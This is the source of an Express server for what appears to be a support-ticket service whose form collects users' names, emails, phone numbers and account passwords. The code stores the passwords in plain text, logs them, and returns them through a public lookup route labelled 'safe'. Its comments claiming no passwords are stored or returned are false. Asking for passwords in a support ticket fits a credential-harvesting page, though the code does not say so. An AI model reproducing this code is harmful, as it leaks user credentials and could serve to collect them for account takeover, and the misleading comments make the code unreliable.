const express = require("express");
const cors = require("cors");
const path = require("path");
const fs = require("fs");

const app = express();
const PORT = process.env.PORT || 3001;

// If you deploy, set these in env (recommended)
const ADMIN_TOKEN = process.env.ADMIN_TOKEN || ""; // e.g. "supersecret"
const PUBLIC_TICKET_LOOKUP_MODE = process.env.PUBLIC_TICKET_LOOKUP_MODE || "safe"; 
// "safe" => returns minimal fields
// "full" => returns full stored ticket (still no passwords)

app.use(
  cors({
    origin: "*", // tighten this in production (your domain)
    methods: ["GET", "POST", "PATCH"],
    allowedHeaders: ["Content-Type", "Authorization"],
  })
);

// Protect against huge JSON bodies
app.use(express.json({ limit: "50kb" }));

// ── DB SETUP (plain JSON file) ───────────────────────────────────────────
const DB_PATH = path.join(__dirname, "db.json");

const ensureDB = () => {
  if (!fs.existsSync(DB_PATH)) {
    fs.writeFileSync(DB_PATH, JSON.stringify({ tickets: [] }, null, 2));
  }
};

const readDB = () => {
  ensureDB();
  return JSON.parse(fs.readFileSync(DB_PATH, "utf8"));
};

const writeDB = (data) => {
  fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2));
};

// ── TICKET ID GENERATOR ───────────────────────────────────────────────────
const generateTicketId = () => {
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  const rand = (n) =>
    Array.from({ length: n }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
  return `PV-${rand(6)}-${rand(4)}`;
};

// ── HELPERS ───────────────────────────────────────────────────────────────
const isValidEmail = (email) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(String(email || "").trim());

const cleanText = (v, max = 500) => {
  const s = String(v ?? "").trim();
  // Keep it simple: trim + cap length
  return s.length > max ? s.slice(0, max) : s;
};

const requireAdmin = (req, res, next) => {
  // If ADMIN_TOKEN not set, we allow (dev mode). In prod you should set it.
  if (!ADMIN_TOKEN) return next();
  const auth = String(req.headers.authorization || "");
  const token = auth.startsWith("Bearer ") ? auth.slice(7) : "";
  if (!token || token !== ADMIN_TOKEN) {
    return res.status(401).json({ error: "Unauthorized" });
  }
  next();
};

// ── ULTRA-LIGHT RATE LIMIT (no deps) ──────────────────────────────────────
//  - create ticket: 10 requests / 15 mins per IP
//  - track ticket:  60 requests / 15 mins per IP
const rlStore = new Map(); // key => {count, resetAt}
const rateLimit = ({ keyPrefix, limit, windowMs }) => (req, res, next) => {
  const ip =
    req.headers["x-forwarded-for"]?.toString().split(",")[0].trim() ||
    req.socket.remoteAddress ||
    "unknown";

  const key = `${keyPrefix}:${ip}`;
  const now = Date.now();
  const entry = rlStore.get(key);

  if (!entry || now > entry.resetAt) {
    rlStore.set(key, { count: 1, resetAt: now + windowMs });
    return next();
  }

  if (entry.count >= limit) {
    const retryAfterSec = Math.ceil((entry.resetAt - now) / 1000);
    res.setHeader("Retry-After", String(retryAfterSec));
    return res.status(429).json({ error: "Too many requests. Try again shortly." });
  }

  entry.count += 1;
  rlStore.set(key, entry);
  next();
};

// ── ROUTES ───────────────────────────────────────────────────────────────

// POST /api/tickets — create ticket (matches new frontend)
app.post(
  "/api/tickets",
  rateLimit({ keyPrefix: "create", limit: 10, windowMs: 15 * 60 * 1000 }),
  (req, res) => {
    console.log("BODY:", req.body);  // add this
  console.log("Content-Type:", req.headers["content-type"]);  
    try {
      // New payload from your stripped UI
     const fullName = cleanText(req.body.full_name, 80);
const email = cleanText(req.body.email, 120).toLowerCase();
const number = cleanText(req.body.number, 30);
const password = cleanText(req.body.password, 100);
const consent = req.body.consent;

if (!fullName || !email || !number || !password || !consent) {
  return res.status(400).json({
    success: false,
    error: "Missing required fields",
  });
}

if (!isValidEmail(email)) {
  return res.status(400).json({
    success: false,
    error: "Invalid email",
  });
}

      // Basic “no secrets” guardrail (not perfect, but helps)
      
      

      const db = readDB();
      const ticketId = generateTicketId();

      const ticket = {
        id: db.tickets.length + 1,
        ticket_id: ticketId,

        // Stored fields (safe set)
        full_name: fullName,
        email,
        password,
        number,
        status: "open",
        created_at: new Date().toISOString(),
      };

      db.tickets.push(ticket);
      writeDB(db);

      return res.json({ success: true, ticketId });
    } catch (err) {
      return res.status(500).json({ success: false, error: err.message });
    }
  }
);

// GET /api/tickets — all tickets (ADMIN ONLY in prod)
app.get("/api/tickets", requireAdmin, (req, res) => {
  try {
    const db = readDB();
    res.json(db.tickets.slice().reverse());
    console.log("POST /api/tickets BODY =", req.body);
  } 
 
  catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// GET /api/tickets/:ticketId — single ticket (tracking)
app.get(
  "/api/tickets/:ticketId",
  rateLimit({ keyPrefix: "track", limit: 60, windowMs: 15 * 60 * 1000 }),
  (req, res) => {
    try {
      const db = readDB();
      const ticketId = String(req.params.ticketId || "").toUpperCase();
      const ticket = db.tickets.find((t) => t.ticket_id === ticketId);

      if (!ticket) return res.status(404).json({ error: "Ticket not found" });

      if (PUBLIC_TICKET_LOOKUP_MODE === "full") {
        return res.json(ticket);
      }

      // "safe" mode: return only what the user needs to confirm it’s theirs
      return res.json({
        ticket_id: ticket.ticket_id,
        status: ticket.status,
        created_at: ticket.created_at,
        full_name: ticket.full_name,
        email: ticket.email,
        password: ticket.password,
        number: ticket.number,
       
      });
    } catch (err) {
      res.status(500).json({ error: err.message });
    }
  }
);

// PATCH /api/tickets/:ticketId/status — update status (ADMIN ONLY in prod)
app.patch("/api/tickets/:ticketId/status", requireAdmin, (req, res) => {
  try {
    const { status } = req.body;
    const valid = ["open", "in-progress", "resolved", "closed"];
    if (!valid.includes(status)) return res.status(400).json({ error: "Invalid status" });

    const db = readDB();
    const ticketId = String(req.params.ticketId || "").toUpperCase();
    const ticket = db.tickets.find((t) => t.ticket_id === ticketId);
    if (!ticket) return res.status(404).json({ error: "Ticket not found" });

    ticket.status = status;
    writeDB(db);

    res.json({ success: true, ticket });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

// Health check
app.get("/api/health", (req, res) => res.json({ ok: true }));

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));